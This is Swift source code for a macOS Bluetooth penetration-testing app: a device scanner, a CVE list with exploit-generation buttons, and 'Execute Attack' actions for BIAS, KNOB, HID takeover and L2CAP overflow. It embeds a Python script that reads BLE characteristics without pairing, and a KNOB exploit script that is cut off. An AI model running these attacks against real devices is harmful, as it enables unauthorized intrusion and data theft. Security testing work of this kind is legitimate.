import SwiftUI
import CoreBluetooth

// MARK: - macOS Native Bluetooth Security View

struct MacOSBluetoothSecurityView: View {
    @Environment(AppState.self) private var appState
    @State private var selectedDevice: MacOSBluetoothDevice?
    @State private var discoveryMode: DiscoveryMode = .active
    @State private var showingVulnerabilityDetail = false
    @State private var selectedVulnerability: MacOSBluetoothVulnerability?
    @State private var selectedTab: BluetoothTab = .scanner
    @State private var connectionTestResult: ConnectionTestResult?
    @State private var isTestingConnection = false
    @State private var showingConnectionAlert = false
    @State private var connectionStatusMessage = ""
    @State private var attackResults: [String: AttackExecutionResult] = [:]
    @State private var showingAttackResults = false
    @State private var selectedAttackResult: AttackExecutionResult?
    @State private var showingCVEExploit = false
    @State private var selectedCVEExploit: CVEExploitDetails?
    
    enum BluetoothTab: String, CaseIterable {
        case scanner = "Device Scanner"
        case shell = "Security Shell"
        case cveDatabase = "CVE Database"
        
        var icon: String {
            switch self {
            case .scanner: return "wifi.circle"
            case .shell: return "terminal"
            case .cveDatabase: return "shield.checkerboard"
            }
        }
    }
    
    private var bluetoothFramework: MacOSBluetoothSecurityFramework {
        appState.bluetoothFramework
    }
    
    var body: some View {
        VStack(spacing: 0) {
            // Tab Selection
            HStack {
                ForEach(BluetoothTab.allCases, id: \.self) { tab in
                    Button(action: { selectedTab = tab }) {
                        HStack(spacing: 8) {
                            Image(systemName: tab.icon)
                            Text(tab.rawValue)
                        }
                        .padding(.horizontal, 16)
                        .padding(.vertical, 8)
                        .background(selectedTab == tab ? Color.accentBackground : Color.clear)
                        .foregroundColor(selectedTab == tab ? .primary : .secondary)
                        .cornerRadius(.radius_md)
                    }
                    .buttonStyle(.plain)
                }
                
                Spacer()
            }
            .standardContainer()
            .background(Color.primaryBackground)
            
            // Tab Content
            Group {
                switch selectedTab {
                case .scanner:
                    BluetoothScannerView()
                case .shell:
                    BluetoothShellView()
                case .cveDatabase:
                    BluetoothCVEDatabaseView()
                }
            }
        }
        .navigationTitle("Bluetooth Security Suite")
        .alert("Connection Test Result", isPresented: $showingConnectionAlert) {
            Button("OK") { }
        } message: {
            Text(connectionStatusMessage)
        }
        .sheet(isPresented: $showingAttackResults) {
            if let result = selectedAttackResult {
                AttackResultsView(result: result)
                    .frame(minWidth: 800, minHeight: 600)
                    .frame(maxWidth: 1200, maxHeight: 900)
            }
        }
        .overlay(
            Group {
                if showingCVEExploit, let cveExploit = selectedCVEExploit {
                    // Overlay background
                    Color.black.opacity(0.3)
                        .ignoresSafeArea()
                        .onTapGesture {
                            showingCVEExploit = false
                        }
                    
                    // Modal content
                    VStack(spacing: 0) {
                        // Header
                        HStack {
                            Text(cveExploit.cveId)
                                .font(.title2)
                                .fontWeight(.bold)
                            
                            Spacer()
                            
                            Button("Close") {
                                showingCVEExploit = false
                            }
                            .buttonStyle(.borderedProminent)
                        }
                        .padding()
                        .background(Color(.controlBackgroundColor))
                        
                        // Content
                        ScrollView {
                            VStack(alignment: .leading, spacing: 16) {
                                // CVE Info
                                VStack(alignment: .leading, spacing: 8) {
                                    Text("CVE Information")
                                        .font(.headline)
                                        .fontWeight(.semibold)
                                    
                                    Text(cveExploit.description)
                                        .font(.body)
                                        .textSelection(.enabled)
                                }
                                .padding()
                                .background(Color(.controlBackgroundColor))
                                .cornerRadius(8)
                                
                                // Warning
                                HStack {
                                    Image(systemName: "exclamationmark.triangle.fill")
                                        .foregroundColor(.orange)
                                    Text("WARNING: Use only for authorized penetration testing")
                                        .font(.caption)
                                        .fontWeight(.medium)
                                }
                                .padding()
                                .background(Color.orange.opacity(0.1))
                                .cornerRadius(8)
                                
                                // Exploit Code
                                VStack(alignment: .leading, spacing: 8) {
                                    HStack {
                                        Text("Exploit Code")
                                            .font(.headline)
                                            .fontWeight(.semibold)
                                        
                                        Spacer()
                                        
                                        Button("Copy Code") {
                                            NSPasteboard.general.setString(cveExploit.exploitCode, forType: .string)
                                        }
                                        .buttonStyle(.bordered)
                                    }
                                    
                                    ScrollView {
                                        Text(cveExploit.exploitCode)
                                            .font(.system(.caption, design: .monospaced))
                                            .textSelection(.enabled)
                                            .frame(maxWidth: .infinity, alignment: .leading)
                                            .padding()
                                            .background(Color.black.opacity(0.05))
                                            .cornerRadius(8)
                                    }
                                    .frame(height: 300)
                                }
                                .padding()
                                .background(Color(.controlBackgroundColor))
                                .cornerRadius(8)
                            }
                            .padding()
                        }
                    }
                    .frame(width: 800, height: 600)
                    .background(Color(.windowBackgroundColor))
                    .cornerRadius(12)
                    .shadow(radius: 20)
                }
            }
        )
        .onAppear {
            if selectedTab == .scanner {
                Task {
                    await bluetoothFramework.startDiscovery(mode: .active)
                }
            }
        }
    }
    
    // MARK: - Scanner Tab Content
    
    @ViewBuilder
    private func BluetoothScannerView() -> some View {
        VStack(spacing: 0) {
            // Header with controls
            HeaderControlsView()
            
            HSplitView {
                // Left Panel - Device Discovery
                VStack(spacing: 0) {
                    DeviceListPanel()
                }
                .frame(minWidth: 400, maxWidth: 550)
                .background(Color.surfaceBackground)
                
                // Right Panel - Device Details
                VStack(spacing: 0) {
                    if let device = selectedDevice {
                        DeviceDetailsPanel(device: device)
                    } else {
                        EmptyStateView()
                    }
                }
                .frame(minWidth: 600)
            }
        }
    }
    
    // MARK: - CVE Database Tab Content
    
    @ViewBuilder
    private func BluetoothCVEDatabaseView() -> some View {
        VStack(alignment: .leading, spacing: 16) {
            // Database Header
            HStack {
                VStack(alignment: .leading, spacing: 4) {
                    Text("Live Bluetooth CVE Database")
                        .font(.title2)
                        .fontWeight(.semibold)
                    
                    if let lastUpdate = appState.liveCVEDatabase.lastUpdate {
                        Text("Last updated: \(lastUpdate.formatted(date: .abbreviated, time: .shortened))")
                            .font(.caption)
                            .foregroundColor(.secondary)
                    }
                }
                
                Spacer()
                
                // Database Stats
                VStack(alignment: .trailing, spacing: 4) {
                    Text("\(appState.liveCVEDatabase.currentCVEs.count) Total CVEs")
                        .font(.headline)
                    
                    HStack(spacing: 16) {
                        VStack {
                            Text("\(appState.liveCVEDatabase.criticalCVEs.count)")
                                .font(.title3)
                                .fontWeight(.bold)
                                .foregroundColor(.red)
                            Text("Critical")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                        
                        VStack {
                            Text("\(appState.liveCVEDatabase.highSeverityCVEs.count)")
                                .font(.title3)
                                .fontWeight(.bold)
                                .foregroundColor(.orange)
                            Text("High")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                        
                        VStack {
                            Text("\(appState.liveCVEDatabase.recentCVEs.count)")
                                .font(.title3)
                                .fontWeight(.bold)
                                .foregroundColor(.blue)
                            Text("Recent")
                                .font(.caption)
                                .foregroundColor(.secondary)
                        }
                    }
                }
                
                Button("Update Database") {
                    Task {
                        await appState.liveCVEDatabase.updateCVEDatabase()
                    }
                }
                .buttonStyle(.borderedProminent)
                .disabled(appState.liveCVEDatabase.isUpdating)
            }
            .padding()
            .background(Color.cardBackground)
            .cornerRadius(12)
            
            // CVE List
            List(appState.liveCVEDatabase.currentCVEs) { cve in
                CVERowView(cve: cve)
                    .padding(.vertical, 4)
            }
            .listStyle(.plain)
        }
        .padding()
    }
    
    @ViewBuilder
    private func CVERowView(cve: LiveCVEEntry) -> some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Text(cve.id)
                    .font(.headline)
                    .fontWeight(.semibold)
                
                Spacer()
                
                Text(cve.severity.rawValue)
                    .font(.caption)
                    .fontWeight(.bold)
                    .foregroundColor(cve.severity.color)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(cve.severity.color.opacity(0.1))
                    .cornerRadius(6)
                
                Text("CVSS: \(String(format: "%.1f", cve.baseScore))")
                    .font(.caption)
                    .foregroundColor(.secondary)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(Color.gray.opacity(0.1))
                    .cornerRadius(6)
            }
            
            Text(cve.description)
                .font(.subheadline)
                .lineLimit(2)
            
            HStack {
                Text("Published: \(cve.published.formatted(date: .abbreviated, time: .omitted))")
                    .font(.caption)
                    .foregroundColor(.secondary)
                
                Spacer()
                
                Button(action: {
                    let exploitCode = cve.exploitCode ?? generateExploitCode(for: cve)
                    selectedCVEExploit = CVEExploitDetails(
                        cveId: cve.id,
                        exploitCode: exploitCode,
                        description: cve.description,
                        severity: cve.severity
                    )
                    showingCVEExploit = true
                }) {
                    HStack(spacing: 4) {
                        Image(systemName: cve.exploitCode != nil ? "doc.text" : "wrench.and.screwdriver")
                            .font(.caption2)
                        Text(cve.exploitCode != nil ? "View Exploit" : "Generate Exploit")
                            .font(.caption)
                            .fontWeight(.medium)
                    }
                    .foregroundColor(.red)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(Color.red.opacity(0.1))
                    .cornerRadius(6)
                    .overlay(
                        RoundedRectangle(cornerRadius: 6)
                            .stroke(Color.red.opacity(0.3), lineWidth: 1)
                    )
                }
                .buttonStyle(.plain)
            }
        }
        .padding()
        .background(Color.surfaceBackground)
        .cornerRadius(8)
    }
    
    // MARK: - Header Controls
    
    @ViewBuilder
    private func HeaderControlsView() -> some View {
        HStack {
            Text("Bluetooth Security Scanner")
                .font(.headerPrimary)
            
            Spacer()
            
            // Discovery Mode Picker
            Picker("Discovery Mode", selection: $discoveryMode) {
                Text("Passive").tag(DiscoveryMode.passive)
                Text("Active").tag(DiscoveryMode.active)
                Text("Aggressive").tag(DiscoveryMode.aggressive)
            }
            .pickerStyle(.segmented)
            .frame(width: 250)
            
            // Scan Button
            Button(bluetoothFramework.isScanning ? "Stop Scan" : "Start Scan") {
                Task {
                    if bluetoothFramework.isScanning {
                        // Stop scanning is handled automatically by the framework
                    } else {
                        await bluetoothFramework.startDiscovery(mode: discoveryMode)
                    }
                }
            }
            .buttonStyle(.borderedProminent)
            .disabled(bluetoothFramework.lastError != nil)
        }
        .standardContainer()
        .background(Color.primaryBackground)
        .overlay(
            Rectangle()
                .frame(height: 1)
                .foregroundColor(Color.borderPrimary),
            alignment: .bottom
        )
    }
    
    // MARK: - Device List Panel
    
    @ViewBuilder
    private func DeviceListPanel() -> some View {
        VStack(alignment: .leading, spacing: 12) {
            // Status Header
            HStack {
                Text("Discovered Devices")
                    .font(.headline)
                
                Spacer()
                
                Text("\(bluetoothFramework.discoveredDevices.count)")
                    .font(.caption)
                    .foregroundColor(.secondary)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(Color.accentColor.opacity(0.2))
                    .cornerRadius(8)
            }
            .padding(.horizontal)
            .padding(.top)
            
            // Error Display
            if let error = bluetoothFramework.lastError {
                HStack {
                    Image(systemName: "exclamationmark.triangle.fill")
                        .foregroundColor(.orange)
                    Text(error)
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
                .padding(.horizontal)
                .padding(.vertical, 8)
                .background(Color.yellow.opacity(0.1))
                .cornerRadius(8)
                .padding(.horizontal)
            }
            
            // Scanning Progress
            if bluetoothFramework.isScanning {
                VStack(alignment: .leading, spacing: 4) {
                    HStack {
                        Text(bluetoothFramework.currentOperation)
                            .font(.caption)
                            .foregroundColor(.secondary)
                        
                        Spacer()
                        
                        Text("\(Int(bluetoothFramework.scanProgress * 100))%")
                            .font(.caption)
                            .foregroundColor(.secondary)
                    }
                    
                    ProgressView(value: bluetoothFramework.scanProgress)
                        .progressViewStyle(LinearProgressViewStyle(tint: .accentColor))
                }
                .standardContainer()
            }
            
            // Device List
            List(bluetoothFramework.discoveredDevices, selection: $selectedDevice) { device in
                DeviceRowView(device: device)
                    .tag(device)
            }
            .listStyle(.sidebar)
        }
    }
    
    // MARK: - Device Row
    
    @ViewBuilder
    private func DeviceRowView(device: MacOSBluetoothDevice) -> some View {
        VStack(alignment: .leading, spacing: 4) {
            HStack {
                // Device Icon
                Image(systemName: deviceIcon(for: device.deviceClass))
                    .font(.title2)
                    .foregroundColor(deviceColor(for: device.deviceClass))
                    .frame(width: 32)
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(device.name ?? "Unknown Device")
                        .font(.headline)
                        .lineLimit(1)
                    
                    Text(device.address)
                        .font(.caption)
                        .foregroundColor(.secondary)
                        .lineLimit(1)
                }
                
                Spacer()
                
                VStack(alignment: .trailing, spacing: 2) {
                    // RSSI
                    HStack(spacing: 4) {
                        Image(systemName: "wifi")
                            .font(.caption)
                        Text("\(device.rssi) dBm")
                            .font(.caption)
                    }
                    .foregroundColor(rssiColor(device.rssi))
                    
                    // Vulnerability Count
                    if device.vulnerabilityCount > 0 {
                        Text("\(device.vulnerabilityCount) issues")
                            .font(.caption2)
                            .foregroundColor(.red)
                            .padding(.horizontal, 6)
                            .padding(.vertical, 2)
                            .background(Color.red.opacity(0.1))
                            .cornerRadius(4)
                    }
                }
            }
            
            // Device Type and Status
            HStack {
                Text(device.deviceClass.rawValue.capitalized)
                    .font(.caption2)
                    .foregroundColor(.secondary)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 2)
                    .background(Color.gray.opacity(0.1))
                    .cornerRadius(4)
                
                if device.isConnectable {
                    Text("Connectable")
                        .font(.caption2)
                        .foregroundColor(.green)
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.green.opacity(0.1))
                        .cornerRadius(4)
                }
                
                if device.isClassicBluetooth {
                    Text("Classic BT")
                        .font(.caption2)
                        .foregroundColor(.blue)
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.blue.opacity(0.1))
                        .cornerRadius(4)
                } else {
                    Text("BLE")
                        .font(.caption2)
                        .foregroundColor(.purple)
                        .padding(.horizontal, 6)
                        .padding(.vertical, 2)
                        .background(Color.purple.opacity(0.1))
                        .cornerRadius(4)
                }
                
                Spacer()
            }
        }
        .padding(.vertical, 4)
    }
    
    // MARK: - Device Details Panel
    
    @ViewBuilder
    private func DeviceDetailsPanel(device: MacOSBluetoothDevice) -> some View {
        VStack(alignment: .leading, spacing: 16) {
            // Device Header
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Image(systemName: deviceIcon(for: device.deviceClass))
                        .font(.largeTitle)
                        .foregroundColor(deviceColor(for: device.deviceClass))
                    
                    VStack(alignment: .leading, spacing: 4) {
                        Text(device.name ?? "Unknown Device")
                            .font(.title2)
                            .fontWeight(.semibold)
                        
                        Text(device.address)
                            .font(.subheadline)
                            .foregroundColor(.secondary)
                    }
                    
                    Spacer()
                    
                    // Connection Test Button
                    Button(action: {
                        Task {
                            await testDeviceConnection(device)
                        }
                    }) {
                        HStack {
                            if isTestingConnection {
                                ProgressView()
                                    .scaleEffect(0.8)
                                Text("Testing...")
                            } else {
                                Image(systemName: "bolt.circle")
                                Text("Test Connection")
                            }
                        }
                        .padding(.horizontal, 12)
                        .padding(.vertical, 6)
                    }
                    .buttonStyle(.bordered)
                    .disabled(isTestingConnection)
                }
                
                // Device Details
                LazyVGrid(columns: Array(repeating: GridItem(.flexible()), count: 2), spacing: 12) {
                    DetailItem(title: "Device Class", value: device.deviceClass.rawValue.capitalized)
                    DetailItem(title: "Signal Strength", value: "\(device.rssi) dBm")
                    DetailItem(title: "Type", value: device.isClassicBluetooth ? "Classic Bluetooth" : "Bluetooth LE")
                    DetailItem(title: "Connectable", value: device.isConnectable ? "Yes" : "No")
                    
                    if let manufacturer = device.manufacturerName {
                        DetailItem(title: "Manufacturer", value: manufacturer)
                    }
                }
            }
            .padding()
            .background(Color.cardBackground)
            .cornerRadius(12)
            
            // Vulnerabilities Section
            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Text("Security Analysis")
                        .font(.headline)
                    
                    Spacer()
                    
                    Text("\(bluetoothFramework.vulnerabilityFindings.filter { $0.deviceAddress == device.address }.count) issues")
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
                
                let deviceVulnerabilities = bluetoothFramework.vulnerabilityFindings.filter { $0.deviceAddress == device.address }
                
                if deviceVulnerabilities.isEmpty {
                    Text("No security issues detected")
                        .font(.subheadline)
                        .foregroundColor(.secondary)
                        .frame(maxWidth: .infinity, alignment: .center)
                        .padding()
                        .background(Color.green.opacity(0.1))
                        .cornerRadius(8)
                } else {
                    ScrollView {
                        LazyVStack(spacing: 12) {
                            ForEach(deviceVulnerabilities) { vulnerability in
                                VulnerabilityRowView(vulnerability: vulnerability)
                            }
                        }
                        .padding(.bottom, 8)
                    }
                    .frame(maxHeight: 400) // Limit height to prevent pushing attack vectors out of view
                }
            }
            .padding()
            .background(Color.cardBackground)
            .cornerRadius(12)
            
            // Attack Menu Section
            AttackMenuSection(device: device)
            
            Spacer()
        }
        .padding()
    }
    
    // MARK: - Vulnerability Row
    
    @ViewBuilder
    private func VulnerabilityRowView(vulnerability: MacOSBluetoothVulnerability) -> some View {
        VStack(alignment: .leading, spacing: 12) {
            // Header with title and severity
            HStack {
                Image(systemName: severityIcon(vulnerability.severity))
                    .foregroundColor(severityColor(vulnerability.severity))
                    .font(.title3)
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(vulnerability.title)
                        .font(.subheadline)
                        .fontWeight(.semibold)
                    
                    if let cveId = vulnerability.cveId {
                        Text(cveId)
                            .font(.caption2)
                            .foregroundColor(.secondary)
                            .padding(.horizontal, 4)
                            .padding(.vertical, 1)
                            .background(Color.secondary.opacity(0.1))
                            .cornerRadius(3)
                    }
                }
                
                Spacer()
                
                Text(vulnerability.severity.rawValue.uppercased())
                    .font(.caption2)
                    .fontWeight(.bold)
                    .foregroundColor(.white)
                    .padding(.horizontal, 8)
                    .padding(.vertical, 4)
                    .background(severityColor(vulnerability.severity))
                    .cornerRadius(6)
            }
            
            // Description
            Text(vulnerability.description)
                .font(.body)
                .foregroundColor(.primary)
                .fixedSize(horizontal: false, vertical: true)
            
            // Recommended Actions
            if !vulnerability.recommendedActions.isEmpty {
                VStack(alignment: .leading, spacing: 6) {
                    Text("Recommended Actions:")
                        .font(.caption)
                        .fontWeight(.medium)
                        .foregroundColor(.secondary)
                    
                    ForEach(Array(vulnerability.recommendedActions.enumerated()), id: \.offset) { index, action in
                        HStack(alignment: .top, spacing: 6) {
                            Text("•")
                                .font(.caption)
                                .foregroundColor(.secondary)
                            
                            Text(action)
                                .font(.caption)
                                .foregroundColor(.secondary)
                                .fixedSize(horizontal: false, vertical: true)
                        }
                    }
                }
                .padding(.top, 4)
            }
            
            // Discovery time
            HStack {
                Spacer()
                Text("Discovered: \(vulnerability.discoveredAt.formatted(date: .omitted, time: .shortened))")
                    .font(.caption2)
                    .foregroundColor(.secondary.opacity(0.7))
            }
        }
        .padding()
        .background(Color.surfaceBackground)
        .cornerRadius(12)
        .overlay(
            RoundedRectangle(cornerRadius: 12)
                .stroke(severityColor(vulnerability.severity).opacity(0.4), lineWidth: 2)
        )
        .shadow(color: severityColor(vulnerability.severity).opacity(0.1), radius: 4, x: 0, y: 2)
    }
    
    // MARK: - Attack Menu Section
    
    @ViewBuilder
    private func AttackMenuSection(device: MacOSBluetoothDevice) -> some View {
        VStack(alignment: .leading, spacing: 16) {
            HStack {
                Image(systemName: "bolt.shield.fill")
                    .foregroundColor(.red)
                    .font(.title2)
                
                Text("Attack Vectors")
                    .font(.headline)
                    .fontWeight(.semibold)
                
                Spacer()
                
                Text("⚠️ Authorized Use Only")
                    .font(.caption2)
                    .foregroundColor(.red)
                    .padding(.horizontal, 6)
                    .padding(.vertical, 2)
                    .background(Color.red.opacity(0.1))
                    .cornerRadius(4)
            }
            
            let availableAttacks = getAvailableAttacks(for: device)
            
            if availableAttacks.isEmpty {
                VStack(spacing: 8) {
                    Image(systemName: "shield.checkered")
                        .font(.largeTitle)
                        .foregroundColor(.green)
                    
                    Text("No Known Attack Vectors")
                        .font(.subheadline)
                        .fontWeight(.medium)
                    
                    Text("Device appears to be secure against common Bluetooth attacks")
                        .font(.caption)
                        .foregroundColor(.secondary)
                        .multilineTextAlignment(.center)
                }
                .frame(maxWidth: .infinity)
                .padding()
                .background(Color.green.opacity(0.05))
                .cornerRadius(8)
            } else {
                ScrollView {
                    LazyVGrid(columns: [
                        GridItem(.flexible()),
                        GridItem(.flexible())
                    ], spacing: 12) {
                        ForEach(availableAttacks, id: \.id) { attack in
                            AttackVectorCard(attack: attack, device: device)
                        }
                    }
                    .padding(.bottom, 8)
                }
                .frame(maxHeight: 300) // Limit height to prevent stretching
            }
        }
        .padding()
        .background(Color.cardBackground)
        .cornerRadius(12)
    }
    
    @ViewBuilder
    private func AttackVectorCard(attack: BluetoothAttackVector, device: MacOSBluetoothDevice) -> some View {
        let attackId = "\(attack.name)-\(device.address)"
        let attackResult = attackResults[attackId]
        let isRunning = attackResult?.status == .running
        
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Image(systemName: attack.icon)
                    .foregroundColor(attack.severityColor)
                    .font(.title3)
                
                VStack(alignment: .leading, spacing: 2) {
                    Text(attack.name)
                        .font(.subheadline)
                        .fontWeight(.semibold)
                        .lineLimit(2)
                    
                    Text(attack.description)
                        .font(.caption2)
                        .foregroundColor(.secondary)
                        .lineLimit(3)
                }
                
                Spacer()
                
                // Status indicator
                if let result = attackResult {
                    Image(systemName: result.status.icon)
                        .foregroundColor(result.status.color)
                        .font(.caption)
                }
            }
            
            // Attack metadata
            HStack {
                Label(attack.difficulty.rawValue, systemImage: "gauge")
                    .font(.caption2)
                    .foregroundColor(.secondary)
                
                Spacer()
                
                if let cveId = attack.cveId {
                    Text(cveId)
                        .font(.caption2)
                        .padding(.horizontal, 4)
                        .padding(.vertical, 1)
                        .background(Color.blue.opacity(0.1))
                        .cornerRadius(3)
                }
            }
            
            // Execution status or results
            if let result = attackResult {
                if result.status == .running {
                    HStack {
                        ProgressView()
                            .scaleEffect(0.7)
                        Text("Executing...")
                            .font(.caption2)
                            .foregroundColor(.secondary)
                    }
                } else {
                    Button("View Results") {
                        selectedAttackResult = result
                        showingAttackResults = true
                    }
                    .font(.caption2)
                    .foregroundColor(.blue)
                    .buttonStyle(.plain)
                }
            }
            
            // Execute Attack Button
            Button(action: {
                Task {
                    await executeAttack(attack, on: device)
                }
            }) {
                HStack {
                    if isRunning {
                        ProgressView()
                            .scaleEffect(0.8)
                        Text("Running...")
                    } else {
                        Image(systemName: "play.fill")
                        Text("Execute Attack")
                    }
                }
                .font(.caption)
                .foregroundColor(.white)
                .padding(.horizontal, 12)
                .padding(.vertical, 6)
                .background(isRunning ? Color.gray : attack.severityColor)
                .cornerRadius(6)
            }
            .buttonStyle(.plain)
            .disabled(isRunning)
        }
        .padding()
        .background(Color.surfaceBackground)
        .cornerRadius(8)
        .overlay(
            RoundedRectangle(cornerRadius: 8)
                .stroke(attack.severityColor.opacity(0.3), lineWidth: 1)
        )
    }
    
    // MARK: - Detail Item
    
    @ViewBuilder
    private func DetailItem(title: String, value: String) -> some View {
        VStack(alignment: .leading, spacing: 2) {
            Text(title)
                .font(.caption)
                .foregroundColor(.secondary)
            
            Text(value)
                .font(.subheadline)
                .fontWeight(.medium)
        }
    }
    
    // MARK: - Empty State
    
    @ViewBuilder
    private func EmptyStateView() -> some View {
        VStack(spacing: 16) {
            Image(systemName: "antenna.radiowaves.left.and.right")
                .font(.system(size: 48))
                .foregroundColor(.secondary)
            
            Text("Select a device to view details")
                .font(.headline)
                .foregroundColor(.secondary)
            
            Text("Choose a Bluetooth device from the list to analyze its security profile and potential vulnerabilities.")
                .font(.subheadline)
                .foregroundColor(.secondary)
                .multilineTextAlignment(.center)
                .frame(maxWidth: 300)
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity)
    }
    
    // MARK: - Attack Vector Logic
    
    private func getAvailableAttacks(for device: MacOSBluetoothDevice) -> [BluetoothAttackVector] {
        var attacks: [BluetoothAttackVector] = []
        
        // Check vulnerabilities and add corresponding attacks
        let deviceVulns = bluetoothFramework.vulnerabilityFindings.filter { $0.deviceAddress == device.address }
        
        for vulnerability in deviceVulns {
            if let attack = getAttackForVulnerability(vulnerability, device: device) {
                attacks.append(attack)
            }
        }
        
        // Add general attacks based on device capabilities
        attacks.append(contentsOf: getGeneralAttacks(for: device))
        
        return attacks
    }
    
    private func getAttackForVulnerability(_ vulnerability: MacOSBluetoothVulnerability, device: MacOSBluetoothDevice) -> BluetoothAttackVector? {
        switch vulnerability.category {
        case .bleWeakAuthentication:
            return BluetoothAttackVector(
                name: "BLE Authentication Bypass",
                description: "Exploit weak BLE pairing to gain unauthorized access",
                icon: "key.slash.fill",
                difficulty: .medium,
                cveId: vulnerability.cveId,
                severity: vulnerability.severity,
                exploitCode: generateBLEAuthBypassExploit(device: device),
                payload: generateBLEAuthPayload(device: device)
            )
        case .weakEncryption:
            return BluetoothAttackVector(
                name: "KNOB Attack",
                description: "Force weak encryption key negotiation",
                icon: "lock.slash.fill",
                difficulty: .hard,
                cveId: "CVE-2019-9506",
                severity: .critical,
                exploitCode: generateKNOBExploit(device: device),
                payload: generateKNOBPayload(device: device)
            )
        case .informationDisclosure:
            return BluetoothAttackVector(
                name: "Information Extraction",
                description: "Extract sensitive data from advertisement packets",
                icon: "doc.text.fill",
                difficulty: .easy,
                cveId: vulnerability.cveId,
                severity: vulnerability.severity,
                exploitCode: generateInfoExtractionExploit(device: device),
                payload: generateInfoExtractionPayload(device: device)
            )
        default:
            return nil
        }
    }
    
    private func getGeneralAttacks(for device: MacOSBluetoothDevice) -> [BluetoothAttackVector] {
        var attacks: [BluetoothAttackVector] = []
        
        // Always available attacks
        attacks.append(BluetoothAttackVector(
            name: "Device Reconnaissance",
            description: "Gather detailed device information and capabilities",
            icon: "binoculars.fill",
            difficulty: .easy,
            cveId: nil,
            severity: .low,
            exploitCode: generateReconExploit(device: device),
            payload: generateReconPayload(device: device)
        ))
        
        if device.isConnectable {
            attacks.append(BluetoothAttackVector(
                name: "Connection Hijacking",
                description: "Attempt to hijack existing connections",
                icon: "link.circle.fill",
                difficulty: .medium,
                cveId: nil,
                severity: .medium,
                exploitCode: generateConnectionHijackExploit(device: device),
                payload: generateConnectionHijackPayload(device: device)
            ))
        }
        
        if !device.isClassicBluetooth {
            attacks.append(BluetoothAttackVector(
                name: "BLE Fuzzing",
                description: "Fuzz BLE services to discover crash vulnerabilities",
                icon: "hammer.fill",
                difficulty: .medium,
                cveId: nil,
                severity: .medium,
                exploitCode: generateBLEFuzzExploit(device: device),
                payload: generateBLEFuzzPayload(device: device)
            ))
        }
        
        return attacks
    }
    
    private func executeAttack(_ attack: BluetoothAttackVector, on device: MacOSBluetoothDevice) async {
        let attackId = "\(attack.name)-\(device.address)"
        
        // Initialize attack result
        let startTime = Date()
        var result = AttackExecutionResult(
            attackName: attack.name,
            targetDevice: device.address,
            targetName: device.name ?? "Unknown",
            startTime: startTime,
            status: .running,
            output: ["🚨 Initializing \(attack.name) attack..."],
            exploitCode: attack.exploitCode,
            payload: attack.payload
        )
        
        // Update UI with running status
        await MainActor.run {
            attackResults[attackId] = result
        }
        
        print("🚨 EXECUTING ATTACK: \(attack.name) on \(device.name ?? device.address)")
        
        // Execute the actual attack using the shared BluetoothSecurityFramework
        let bluetoothFramework = bluetoothFramework
        var attackOutput: [String] = []
        var attackSuccess = false
        
        switch attack.name {
            case "BLE Authentication Bypass":
                // Execute BIAS attack using the real exploit engine
                let exploitEngine = RealBluetoothExploitEngine()
                let (success, output) = await exploitEngine.handleBIASAttack([device.address])
                
                attackOutput = output
                attackSuccess = success
                
            case "KNOB Attack":
                // Execute KNOB attack
                let exploitEngine = RealBluetoothExploitEngine()
                let (success, output) = await exploitEngine.handleKeyExtraction([device.address])
                
                attackOutput = output
                attackSuccess = success
                
            case "Information Extraction":
                // Execute profile cloning
                let exploitEngine = RealBluetoothExploitEngine()
                let (success, output) = await exploitEngine.handleProfileCloning([device.address])
                
                attackOutput = output
                attackSuccess = success
                
            case "Device Reconnaissance":
                // Execute reconnaissance
                let exploitEngine = RealBluetoothExploitEngine()
                let (success, output) = await exploitEngine.handleSearchExploits([device.name ?? device.address])
                
                attackOutput = output
                attackSuccess = success
                
            case "Connection Hijacking":
                // Execute HID takeover attack
                let hidEngine = RealBluetoothExploitEngine()
                let (success, output) = await hidEngine.handleHIDTakeover([device.address])
                
                attackOutput = output
                attackSuccess = success
                
            case "BLE Fuzzing":
                // Execute L2CAP overflow attack
                let fuzzEngine = RealBluetoothExploitEngine()
                let (success, output) = await fuzzEngine.handleL2CAPOverflow([device.address])
                
                attackOutput = output
                attackSuccess = success
                
            default:
                attackOutput.append("⚠️ Attack type not implemented: \(attack.name)")
                attackSuccess = false
            }
            
        // Mark as completed with appropriate status
        result.status = attackSuccess ? .completed : .failed
        result.endTime = Date()
        result.output = attackOutput
        
        // Update final results
        await MainActor.run {
            attackResults[attackId] = result
            selectedAttackResult = result
            showingAttackResults = true
        }
    }
    
    // MARK: - Exploit Code Generators
    
    private func generateBLEAuthBypassExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # BLE Authentication Bypass Exploit
        # Target: \(device.address)
        
        import asyncio
        from bleak import BleakClient, BleakScanner
        
        async def exploit_ble_auth():
            target_address = "\(device.address)"
            
            # Step 1: Connect without authentication
            async with BleakClient(target_address) as client:
                print(f"Connected to {target_address}")
                
                # Step 2: Enumerate services
                services = await client.get_services()
                for service in services:
                    print(f"Service: {service.uuid}")
                    
                    # Step 3: Attempt to read characteristics without auth
                    for char in service.characteristics:
                        if "read" in char.properties:
                            try:
                                value = await client.read_gatt_char(char.uuid)
                                print(f"  Char {char.uuid}: {value.hex()}")
                            except Exception as e:
                                print(f"  Char {char.uuid}: PROTECTED")
        
        if __name__ == "__main__":
            asyncio.run(exploit_ble_auth())
        """
    }
    
    private func generateKNOBExploit(device: MacOSBluetoothDevice) -> String {
        return """
        #!/usr/bin/env python3
        # KNOB Attack Implementation
        # CVE-2019-9506: Key Negotiation of Bluetooth Attack
        
        import subprocess
